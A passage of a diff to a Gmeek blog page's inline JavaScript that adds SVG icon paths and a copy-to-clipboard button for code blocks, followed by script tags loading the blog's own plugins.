1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -508,7 +497,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
